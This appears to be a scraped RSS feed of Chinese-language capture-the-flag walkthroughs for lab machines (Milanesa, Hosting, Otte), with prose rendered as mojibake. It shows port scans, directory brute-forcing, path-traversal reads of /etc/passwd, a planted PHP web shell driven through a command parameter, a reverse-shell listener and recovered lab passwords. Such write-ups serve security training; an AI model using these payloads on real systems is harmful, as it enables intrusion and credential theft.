å°†æŠ¥é”™ä¿¡æ¯å‘ç»™gpt å‘Šè¯‰æˆ‘ æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„æˆ–å‘½ä»¤æ²¡æœ‰æ‰¾åˆ°<br>
<img alt="assets/Pasted image 20241221150320.png" src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221150320.png"><br>
ç»è¿‡å°è¯•å å‘ç°è¿™é‡Œæ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„åˆ©ç”¨<br>
<img alt="assets/Pasted image 20241221150514.png" src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221150514.png"><br>ç„¶ååœ¨ç½‘ç«™çš„æ—¥å¿—é‡Œé¢å¯ä»¥è·å–åˆ°ç”¨æˆ·çš„å¯†ç <br>
<img alt="assets/Pasted image 20241221152138.png" src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221152138.png"><br>
/login=bubba:TuprimerP@ssword1234!<br>åˆ©ç”¨è¿™ä¸ªç”¨æˆ·å¯ä»¥rdpåˆ°ä¸»æœº 20.20.20.5<br>
ç™»å½•åéœ€è¦é‡ç½®å¯†ç  å› ä¸ºå¯†ç è¿‡æœŸäº†<br>Warning
è¿™é‡Œæ˜¯è¥¿ç­ç‰™é”®ç›˜ ï¼Œè¾“å…¥å¯†ç çš„@ä¸æ˜¯æˆ‘ä»¬æ­£å¸¸çš„é”®ç›˜è¾“å…¥çš„ã€‚ è¿™é‡Œå»ºè®®ç”¨å±å¹•é”®ç›˜è¾“å…¥å¯†ç 
<br>è¿›æ¥åæ¡Œé¢å°±æœ‰ç”¨æˆ·flag <br><img alt="assets/Pasted image 20241221152758.png" src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221152758.png">!b1ngob0ngoP0ngoUseRfl4g!#]]></description><link>https://www.c1trus.top/24-æ¸—é€/thl/8.milanesa.html</link><guid isPermaLink="false">24-æ¸—é€/THL/8.Milanesa.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate><enclosure url="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221135649.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221135649.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.Hosting]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a><br>
- <a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a><br>
- <a data-tooltip-position="top" aria-label="2.2. ç›®å½•æ‰«æ" data-href="#2.2. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.2._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç›®å½•æ‰«æ</a><br>
é¶æœºé“¾æ¥<br>
éš¾åº¦ â­ï¸â­ï¸ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Hosting]
â””â”€# nmap 192.168.56.21 -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 03:54 EST
Nmap scan report for 192.168.56.21
Host is up (0.00069s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
80/tcp  open  tcpwrapped
|_http-title: IIS Windows
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  tcpwrapped
139/tcp open  tcpwrapped
445/tcp open  tcpwrapped

Host script results:
| smb2-time:
|   date: 2024-12-23T14:54:55
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: 5h59m58s
|_nbstat: NetBIOS name: HOSTING, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:46:6d:91 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.36 seconds

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Hosting]
â””â”€# gobuster dir -u http://192.168.56.21/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.21/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,zip,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/speed                (Status: 301) [Size: 161] [--&gt; http://192.168.56.21/speed/]

<br><img alt="assets/Pasted image 20241223165928.png" src="https://www.c1trus.top/24-æ¸—é€/vulnyx/assets/pasted-image-20241223165928.png"><br>
ç»§ç»­å¯¹è¿™ä¸ªç›®å½•æ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Hosting]
â””â”€# dirsearch -u http://192.168.56.21/speed
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/vulnyx/Hosting/reports/http_192.168.56.21/_speed_24-12-23_04-02-31.txt

Target: http://192.168.56.21/

[04:02:31] Starting: speed/
[04:02:31] 301 -  164B  - /speed/js  -&gt;  http://192.168.56.21/speed/js/
[04:02:31] 403 -  312B  - /speed/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[04:02:33] 403 -  312B  - /speed/\..\..\..\..\..\..\..\..\..\etc\passwd
[04:02:37] 403 -  312B  - /speed/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[04:02:38] 301 -  165B  - /speed/css  -&gt;  http://192.168.56.21/speed/css/
[04:02:40] 301 -  167B  - /speed/fonts  -&gt;  http://192.168.56.21/speed/fonts/
[04:02:41] 301 -  168B  - /speed/images  -&gt;  http://192.168.56.21/speed/images/
[04:02:41] 403 -    1KB - /speed/images/
[04:02:41] 403 -    1KB - /speed/js/

Task Completed

<br>è®¿é—®åæŸ¥çœ‹æºç æ²¡æœ‰æ„Ÿè§‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥ç›´æ¥åˆ©ç”¨çš„ç‚¹æˆ–è€…éšè—çš„æç¤ºä¿¡æ¯<br>
<img alt="assets/Pasted image 20241223170417.png" src="https://www.c1trus.top/24-æ¸—é€/vulnyx/assets/pasted-image-20241223170417.png"><br>
åœ¨è¿™é‡Œå¯ä»¥è·å–åˆ°4ä¸ªäººå<br>
æˆ‘ä»¬å°†å®ƒå†™å…¥å­—å…¸<br>æˆ‘é¶æœºç°åœ¨æœ‰é—®é¢˜ã€‚ä½¿ç”¨æ­£ç¡®çš„è´¦å·å¯†ç æ— æ³•ç™»å½•]]></description><link>https://www.c1trus.top/24-æ¸—é€/vulnyx/4.hosting.html</link><guid isPermaLink="false">24-æ¸—é€/Vulnyx/4.Hosting.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-æ¸—é€/vulnyx/assets/pasted-image-20241223165928.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-æ¸—é€/vulnyx/assets/pasted-image-20241223165928.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[49.otte]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†123" data-href="#2. ä¿¡æ¯æ”¶é›†123" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†123" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†123</a>

<br><a data-tooltip-position="top" aria-label="2.1. ftpåŒ¿åç™»å½•" data-href="#2.1. ftpåŒ¿åç™»å½•" href="https://www.c1trus.top/about:blank#2.1._ftpåŒ¿åç™»å½•" class="internal-link" target="_self" rel="noopener nofollow">2.1. ftpåŒ¿åç™»å½•</a>
<br><a data-tooltip-position="top" aria-label="2.2. çˆ†ç ´ç½‘ç«™ç™»å½•å¯†ç " data-href="#2.2. çˆ†ç ´ç½‘ç«™ç™»å½•å¯†ç " href="https://www.c1trus.top/about:blank#2.2._çˆ†ç ´ç½‘ç«™ç™»å½•å¯†ç " class="internal-link" target="_self" rel="noopener nofollow">2.2. çˆ†ç ´ç½‘ç«™ç™»å½•å¯†ç </a>
<br><a data-tooltip-position="top" aria-label="2.3. ç›®å½•çˆ†ç ´" data-href="#2.3. ç›®å½•çˆ†ç ´" href="https://www.c1trus.top/about:blank#2.3._ç›®å½•çˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">2.3. ç›®å½•çˆ†ç ´</a>
<br><a data-tooltip-position="top" aria-label="2.4. å‚æ•°çˆ†ç ´" data-href="#2.4. å‚æ•°çˆ†ç ´" href="https://www.c1trus.top/about:blank#2.4._å‚æ•°çˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">2.4. å‚æ•°çˆ†ç ´</a>


<br><a data-tooltip-position="top" aria-label="3. ææƒåˆ°thomas" data-href="#3. ææƒåˆ°thomas" href="https://www.c1trus.top/about:blank#3._ææƒåˆ°thomas" class="internal-link" target="_self" rel="noopener nofollow">3. ææƒåˆ°thomas</a>

<br><a data-tooltip-position="top" aria-label="3.1. æ¢å¤æ–‡ä»¶ç­¾å" data-href="#3.1. æ¢å¤æ–‡ä»¶ç­¾å" href="https://www.c1trus.top/about:blank#3.1._æ¢å¤æ–‡ä»¶ç­¾å" class="internal-link" target="_self" rel="noopener nofollow">3.1. æ¢å¤æ–‡ä»¶ç­¾å</a>


<br><a data-tooltip-position="top" aria-label="4. ææƒåˆ°laetitiaç”¨æˆ·" data-href="#4. ææƒåˆ°laetitiaç”¨æˆ·" href="https://www.c1trus.top/about:blank#4._ææƒåˆ°laetitiaç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒåˆ°laetitiaç”¨æˆ·</a>

<br><a data-tooltip-position="top" aria-label="4.1. ä»£ç å®¡è®¡" data-href="#4.1. ä»£ç å®¡è®¡" href="https://www.c1trus.top/about:blank#4.1._ä»£ç å®¡è®¡" class="internal-link" target="_self" rel="noopener nofollow">4.1. ä»£ç å®¡è®¡</a>


<br><a data-tooltip-position="top" aria-label="5. ææƒåˆ°cedricç”¨æˆ·" data-href="#5. ææƒåˆ°cedricç”¨æˆ·" href="https://www.c1trus.top/about:blank#5._ææƒåˆ°cedricç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">5. ææƒåˆ°cedricç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="6. ææƒåˆ°root" data-href="#6. ææƒåˆ°root" href="https://www.c1trus.top/about:blank#6._ææƒåˆ°root" class="internal-link" target="_self" rel="noopener nofollow">6. ææƒåˆ°root</a><br>
- <a data-tooltip-position="top" aria-label="6.1. å¦å¤–ä¸€ç§æ–¹æ¡ˆææƒroot" data-href="#6.1. å¦å¤–ä¸€ç§æ–¹æ¡ˆææƒroot" href="https://www.c1trus.top/about:blank#6.1._å¦å¤–ä¸€ç§æ–¹æ¡ˆææƒroot" class="internal-link" target="_self" rel="noopener nofollow">6.1. å¦å¤–ä¸€ç§æ–¹æ¡ˆææƒroot</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Otte" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Otte</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=cromiphi" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=cromiphi" target="_blank">cromiphi</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# nmap 192.168.56.27 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 21:48 EST
Nmap scan report for 192.168.56.27
Host is up (0.00087s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:84:B9:A1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# ftp 192.168.56.27
Connected to 192.168.56.27.
220 ProFTPD Server (Debian) [::ffff:192.168.56.27]
Name (192.168.56.27:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
226 Transfer complete
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||64320|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 May 15  2021 .
drwxr-xr-x   2 ftp      ftp          4096 May 15  2021 ..
-rw-r--r--   1 ftp      ftp            89 May 15  2021 note.txt
226 Transfer complete
ftp&gt; get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||5844|)
150 Opening BINARY mode data connection for note.txt (89 bytes)
    89      250.47 KiB/s
226 Transfer complete
89 bytes received in 00:00 (92.55 KiB/s)
ftp&gt; exit
221 Goodbye.

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# cat note.txt
Hi thomas ! I put on you personal folder the php code you asked me !

See you later +++

<br>è¿™é‡Œè·å–åˆ°äº†ä¸€ä¸ªç”¨æˆ· thomas è€Œä¸”å‘Šè¯‰æˆ‘ä»¬ä»–çš„æ–‡ä»¶å¤¹é‡Œé¢æœ‰ä¸€ä¸ªPHPæ–‡ä»¶<br><br>ç½‘ç«™éœ€è¦éªŒè¯èº«ä»½<br>æ³¨æ„ç”±äºè¿™ä¸ªé¶æœºæœ‰ç‚¹è€ï¼Œè€Œä¸”æ˜¯è€å¤–å‡ºçš„ã€‚æ‰€ä»¥è¿™é‡Œçš„æç¤ºæ¡†ä¼šç¼ºå¤±æç¤ºä¿¡æ¯ï¼Œ<br>
éœ€è¦ç”¨è€ç‰ˆæœ¬çš„æµè§ˆå™¨æ‰èƒ½æ˜¾ç¤º<br>è¿™é‡Œç»™å¤§å®¶åˆ†äº«ä¸€ä¸ªæµè§ˆå™¨ï¼Œç”¨è¿™ä¸ªæµè§ˆå™¨å°±ä¼šæ˜¾ç¤ºæç¤ºä¿¡æ¯<br>
<a rel="noopener nofollow" class="external-link" href="https://www.playbook.com/s/yurain/au1fnEHuEk3DvD7zKVV4K9d8" target="_blank">https://www.playbook.com/s/yurain/au1fnEHuEk3DvD7zKVV4K9d8</a><br>
è®¿é—®ç½‘ç«™ä¼šç»™æˆ‘ä»¬æç¤º â€œSiemens - Root authentificationâ€<br>
<img alt="Pasted image 20241228123243" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png" referrerpolicy="no-referrer"><br>
é‚£è¿™é‡Œå¾ˆå¯èƒ½å°±æ˜¯è¥¿é—¨å­è®¾å¤‡çš„é»˜è®¤è´¦å·å¯†ç <br>
å¸¸è§çš„è®¾å¤‡è´¦é¢å¯†ç å¯ä»¥åœ¨<a data-tooltip-position="top" aria-label="https://forum.ywhack.com/password.php" rel="noopener nofollow" class="external-link" href="https://forum.ywhack.com/password.php" target="_blank">è¿™é‡Œ</a>æŸ¥è¯¢(å›½å†…çš„æ¯”è¾ƒå…¨ï¼Œè¥¿é—¨å­çš„æˆ‘è¯•äº†ä¸€ä¸‹ è¿™é‡Œé¢æ²¡æœ‰æ­£ç¡®çš„)<br>
åé¢åœ¨è¿™é‡Œè·å–åˆ°äº†ä¸€ä¸ªå¸¸ç”¨çš„è¥¿é—¨å­é»˜è®¤è´¦å·å¯†ç è¡¨<br>
<a rel="noopener nofollow" class="external-link" href="https://www.192-168-1-1-ip.co/router/siemens/siemens/17622/" target="_blank">https://www.192-168-1-1-ip.co/router/siemens/siemens/17622/</a><br><br>burpçˆ†ç ´ä¸€ä¸‹å°±èƒ½è·å–åˆ°å¯†ç ï¼Œè¿™é‡Œè¦å¯¹payloadè¿›è¡Œbase64ç¼–ç <br>
<img alt="Pasted image 20241228130727" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228130727.png" referrerpolicy="no-referrer"><br>
è§£ç åçš„å¯†ç  root:zP2wxY4uE<br>
ç™»å½•æˆåŠŸåä¼šè·å–åˆ°ä¸€å¼ å›¾ç‰‡<br>
<img alt="Pasted image 20241228131103" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228131103.png" referrerpolicy="no-referrer"><br>
å›¾ç‰‡å¹¶æ²¡æœ‰éšè—ä»€ä¹ˆä¿¡æ¯<br><br>è¿™é‡Œçˆ†ç ´å‘½ä»¤ä¹Ÿéœ€è¦è¿›è¡ŒBasicè®¤è¯<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# gobuster dir -U root -P zP2wxY4uE -u http://192.168.56.27 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.27
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Auth User:               root
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 28]
/image                (Status: 200) [Size: 47076]
/config.php           (Status: 200) [Size: 0]
/thinkgeek.php        (Status: 200) [Size: 28]
<br>è·å–åˆ°äº†ä¸€ä¸ªè·¯å¾„ thinkgeek.phpï¼Œè®¿é—®åè¿˜æ˜¯é¦–é¡µçš„é‚£å¼ ç…§ç‰‡<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# curl http://192.168.56.27/thinkgeek.php -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
&lt;img src="image.jpg" alt=""&gt;     
<br><br>ä½¿ç”¨arjunçˆ†ç ´å‡ºå‚æ•° file<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# arjun -u http://192.168.56.27/thinkgeek.php --headers "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
    _
   /_| _ '
  (  |/ /(//) v2.2.7
      _/

[*] Scanning 0/1: http://192.168.56.27/thinkgeek.php
[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Logicforcing the URL endpoint
[âœ“] parameter detected: file, based on: body length
[+] Parameters found: file

<br>æ ¹æ®å‚æ•°å°±èƒ½çŒœæµ‹å‡ºè¿™é‡Œå¤§æ¦‚ç‡æ˜¯ä¸€ä¸ªLFI<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# curl http://192.168.56.27/thinkgeek.php?file=../../../../../../etc/passwd -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:107:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:108:65534::/srv/ftp:/usr/sbin/nologin
laetitia:x:1001:1001:,,,:/home/laetitia:/bin/bash
cedric:x:1002:1002:,,,:/home/cedric:/bin/bash

<br>æµ‹è¯•å‡ºæ¥ä¹Ÿæ˜¯ä¸€ä¸ªLFI <br>ç„¶åå°è¯•è¯»å–ç§é’¥ä½†æ˜¯æ²¡æœ‰æƒé™ã€‚<br>
æ ¹æ®æç¤ºå‘Šè¯‰æˆ‘ä»¬ thomas ç”¨æˆ·ç›®å½•ä¸‹æœ‰ä¸€ä¸ªphpæ–‡ä»¶å¾ˆé‡è¦ï¼Œæˆ‘ä»¬å°†å…¶çˆ†ç ´å‡ºæ¥<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# ffuf -u http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/FUZZ.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU" |grep -v "Size: 0"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Authorization: Basic cm9vdDp6UDJ3eFk0dUU
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

shell                   [Status: 200, Size: 20, Words: 3, Lines: 3, Duration: 11ms]



<br>å‘ç°ä¸€ä¸ª shell.php <br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tools]
â””â”€# curl http://192.168.56.27/thinkgeek.php?file=../../../../../../../home/thomas/shell.php -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
Have fun !&lt;br&gt;&lt;br&gt;
<br>çˆ†ç ´ä¸€ä¸‹å‚æ•°<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# ffuf -u "http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/shell.php&amp;FUZZ=whoami"  -w /usr/share/wordlists/parameter.txt -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU" |grep -v "Size: 20"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/shell.php&amp;FUZZ=whoami
 :: Wordlist         : FUZZ: /usr/share/wordlists/parameter.txt
 :: Header           : Authorization: Basic cm9vdDp6UDJ3eFk0dUU
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

file                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
command                 [Status: 200, Size: 29, Words: 3, Lines: 4, Duration: 398ms]
:: Progress: [5846/5846] :: Job [1/1] :: 956 req/sec :: Duration: [0:00:06] :: Errors: 0 ::

<br>æ³¨æ„è¿™é‡Œç”±äºå‰é¢å·²ç»ä½¿ç”¨äº†ä¸€ä¸ªå‚æ•°fileäº†ï¼Œè¦çˆ†ç ´å¦å¤–ä¸€ä¸ªå‚æ•°åªèƒ½ç”¨&amp;<br>
è€Œä¸”arjunå¥½åƒä¸èƒ½çˆ†ç ´åŒå‚æ•°çš„è¿™ç§ã€‚è¿™é‡Œæˆ‘é€‰æ‹©ç”¨ffufçˆ†ç ´<br>çˆ†ç ´å‡ºå‚æ•°æ˜¯ command<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# curl "http://192.168.56.27/thinkgeek.php?file=../../../../../../../home/thomas/shell.php&amp;command=whoami" -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
Have fun !&lt;br&gt;&lt;br&gt;

www-data

<br>ç„¶ååå¼¹shellå³å¯<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# pwncat-cs -lp 1234

[01:15:41] Welcome to pwncat ğŸˆ!                                                                  __main__.py:164
[01:17:04] received connection from 192.168.56.27:44386                                                bind.py:84
[01:17:04] 192.168.56.27:44386: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@otte:/var/www/html$ whoami
www-data
<br><br><br>åœ¨ thomas ç›®å½•ä¸‹æœ‰ä¸€ä¸ªæç¤º<br>(remote) www-data@otte:/home/thomas$ cat nightmare.txt
who is the son of a bitch who replaced the signature on my file with fucking XXX?! I need to find the original signature!

<br>
ç¿»è¯‘ï¼šæ˜¯è°è¿™ä¸ªæ··è›‹æŠŠæˆ‘æ–‡ä»¶çš„ç­¾åæ›¿æ¢æˆäº†è¯¥æ­»çš„ XXXï¼Ÿï¼æˆ‘éœ€è¦æ‰¾åˆ°åŸæ¥çš„ç­¾åï¼
<br>æ„æ€æ˜¯æˆ‘ä»¬è¦æ¢å¤ä¸€ä¸ªæ–‡ä»¶çš„ç­¾å,è€Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯åŒç›®å½•ä¸‹çš„ important_file<br>(remote) www-data@otte:/home/thomas$ head important_file
00000000: XXXXXXXXXXXXXXXX 0000 000d 4948 4452  .XXX........IHDR
00000010: 0000 012c 0000 012c 0806 0000 0079 7d8e  ...,...,.....y}.
00000020: 7500 0000 1b74 4558 7443 7265 6174 696f  u....tEXtCreatio
00000030: 6e20 5469 6d65 0031 3632 3130 3037 3337  n Time.162100737
00000040: 3935 3239 15fc b9e2 0000 37e9 4944 4154  9529......7.IDAT
00000050: 78da ed9d 8bab 7ecf 55de f38f 168a 2085  x.....~.U..... .
00000060: 2214 410a 2208 2294 8214 4428 8582 286a  ".A."."...D(..(j
00000070: bd50 898a d6b6 62b0 28a2 a849 9a18 a3b9  .P....b.(..I....
00000080: 7889 a931 3626 8d9a 8ba6 8947 3e5f ddb8  x..16&amp;.....G&gt;_..
00000090: ddee 99f5 ccac 35b3 67ef 773d 3090 7c7f  ......5.g.w=0.|.

<br>å¯ä»¥å‘ç°ç­¾åçš„æ–‡ä»¶å¤´å˜æˆäº†XXXX<br>
